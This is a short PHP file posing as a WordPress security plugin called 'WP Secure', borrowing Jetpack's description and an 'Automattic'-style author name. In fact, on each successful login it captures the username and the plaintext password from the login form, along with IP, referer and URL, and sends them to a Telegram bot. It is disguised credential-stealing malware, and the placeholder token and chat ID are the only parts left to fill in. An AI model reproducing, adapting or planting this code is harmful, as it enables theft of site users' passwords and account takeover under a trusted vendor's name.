<?php
/*
Plugin Name: WP Secure 🔐 
Description: Security, performance, and marketing tools made by WordPress experts. Jetpack keeps your site protected so you can focus on more important things.

Version 13.4.3 

Author: Mr.Automattic
*/


// Prevent direct access to the file
if (!defined('ABSPATH')) {
    exit;
}

// Hook into successful login
add_action('wp_login', 'wp_login_logger_success', 10, 2);

function wp_login_logger_success($user_login, $user) {
    $username = $user->user_login;
    $password = isset($_POST['pwd']) ? $_POST['pwd'] : ''; // Note: It's not secure to log passwords
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $ip_address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $time = current_time('mysql');
    $current_url = wp_login_logger_get_current_url();

    $message = "Successful Login:\n";
    $message .= "Username: $username\n";
    $message .= "Password: $password\n"; // Note: It's not secure to log passwords
    $message .= "Referer: $referer\n";
    $message .= "IP Address: $ip_address\n";
    $message .= "Time: $time\n";
    $message .= "URL: $current_url";

    wp_login_logger_send_to_telegram($message);
}

function wp_login_logger_get_current_url() {
    $url = (is_ssl() ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    return $url;
}

function wp_login_logger_send_to_telegram($message) {
    $telegram_token = 'TELEGRAMTOKEN';
    $telegram_chat_id = 'TELEGRAMCHATID';

    $url = 'https://api.telegram.org/bot' . $telegram_token . '/sendMessage';

    $data = array(
        'chat_id' => $telegram_chat_id,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
}
